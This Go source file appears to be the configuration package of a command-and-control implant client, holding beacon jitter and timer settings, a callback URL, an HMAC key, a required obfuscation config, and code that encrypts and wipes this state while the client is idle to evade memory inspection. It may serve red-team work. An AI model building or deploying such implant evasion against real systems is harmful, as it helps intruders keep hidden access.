package config

import (
	"encoding/json"
	"flag"
	"os"
	"runtime"
	"strings"
	"sync"

	"src/Client/generic/stateEncryption"
)

var (
	ID                 string  = ""
	Jitter             float64 = 5
	Timer              float64 = 10
	URLPort            string  = "8000"
	SessionAddressPort string  = "2000"
	URL                string  = "http://localhost:" + URLPort
	SessionAddr        string  = "localhost:" + SessionAddressPort
	OsIdentifier       string  = runtime.GOOS + " " + runtime.GOARCH + func() string {
		if IsDebug() {
			return " (DEBUG)"
		} else {
			return ""
		}
	}()
	MaxRetries              int = 5
	ConfigMutex             sync.RWMutex
	PrimaryConnectionMethod string = "beacon"
	HMACKey                 string
	Obfuscation             ObfuscationConfig
	// ObfuscateConfigPath can be injected via -ldflags to provide a default
	// absolute path to the obfuscation JSON (used when no flag/env provided).
	ObfuscateConfigPath string
)

func init() {

	obfuscatePathPtr := flag.String("obfuscate", "", "Path to obfuscation config JSON [optional]")
	primaryConnPtr := flag.String("conn", PrimaryConnectionMethod, "The primary connection method (e.g., session, beacon, websocket) [optional]")
	hmacKeyPtr := flag.String("hmac-key", HMACKey, "The HMAC key for authentication [optional]")

	flag.Parse()

	PrimaryConnectionMethod = *primaryConnPtr
	HMACKey = *hmacKeyPtr

	// Resolve obfuscation config path (flag > env > ldflags default)
	cfgPath := strings.TrimSpace(*obfuscatePathPtr)
	if cfgPath == "" {
		if env := strings.TrimSpace(os.Getenv("OBFUSCATE_CONFIG")); env != "" {
			cfgPath = env
		}
	}
	if cfgPath == "" && strings.TrimSpace(ObfuscateConfigPath) != "" {
		cfgPath = strings.TrimSpace(ObfuscateConfigPath)
	}

	if cfgPath == "" {
		panic("No obfuscation config path provided via flag, environment variable, or build settings")
	}

	data, err := os.ReadFile(cfgPath)
	if err != nil {
		return
	}
	var tmp ObfuscationConfig
	if err := json.Unmarshal(data, &tmp); err != nil {
		return
	}
	ConfigMutex.Lock()
	Obfuscation = tmp
	ConfigMutex.Unlock()

	// Initialize state encryption on startup
	// Note: Logging moved to main.go to avoid import cycle
	stateEncryption.GenerateMasterKey()
}

// EnsureDecrypted ensures that the config state is decrypted before use
// This should be called before accessing any sensitive config variables
func EnsureDecrypted() error {
	if stateEncryption.IsEncrypted() {
		return DecryptConfigState()
	}
	return nil
}

// GetURL returns the URL, ensuring state is decrypted first
func GetURL() (string, error) {
	if err := EnsureDecrypted(); err != nil {
		return "", err
	}
	ConfigMutex.RLock()
	defer ConfigMutex.RUnlock()
	return URL, nil
}

// GetSessionAddr returns the SessionAddr, ensuring state is decrypted first
func GetSessionAddr() (string, error) {
	if err := EnsureDecrypted(); err != nil {
		return "", err
	}
	ConfigMutex.RLock()
	defer ConfigMutex.RUnlock()
	return SessionAddr, nil
}

// GetID returns the ID, ensuring state is decrypted first
func GetID() (string, error) {
	if err := EnsureDecrypted(); err != nil {
		return "", err
	}
	ConfigMutex.RLock()
	defer ConfigMutex.RUnlock()
	return ID, nil
}

// GetHMACKey returns the HMACKey, ensuring state is decrypted first
func GetHMACKey() (string, error) {
	if err := EnsureDecrypted(); err != nil {
		return "", err
	}
	ConfigMutex.RLock()
	defer ConfigMutex.RUnlock()
	return HMACKey, nil
}

// EncryptConfigState encrypts all sensitive config data when the client is idle
func EncryptConfigState() error {
	ConfigMutex.RLock()

	// Create state snapshot
	hostname, _ := os.Hostname()
	state := stateEncryption.CreateState(
		ID,
		URL,
		SessionAddr,
		HMACKey,
		hostname,
		runtime.GOOS,
		"", // ClientID will be generated when needed
		Jitter,
		Timer,
		nil,
	)
	ConfigMutex.RUnlock()

	// Encrypt the state
	if err := stateEncryption.EncryptState(state); err != nil {
		return err
	}

	// Clear sensitive config variables
	ConfigMutex.Lock()
	ID = ""
	HMACKey = ""
	URL = ""
	SessionAddr = ""
	ConfigMutex.Unlock()

	return nil
}

// DecryptConfigState decrypts the encrypted state and restores config variables
func DecryptConfigState() error {
	state, err := stateEncryption.DecryptState()
	if err != nil {
		return err
	}

	// Restore config variables
	ConfigMutex.Lock()
	ID = state.ID
	Jitter = state.Jitter
	Timer = state.Timer
	URL = state.URL
	SessionAddr = state.SessionAddr
	HMACKey = state.HMACKey
	ConfigMutex.Unlock()

	return nil
}

// IsStateEncrypted returns whether the config state is currently encrypted
func IsStateEncrypted() bool {
	return stateEncryption.IsEncrypted()
}
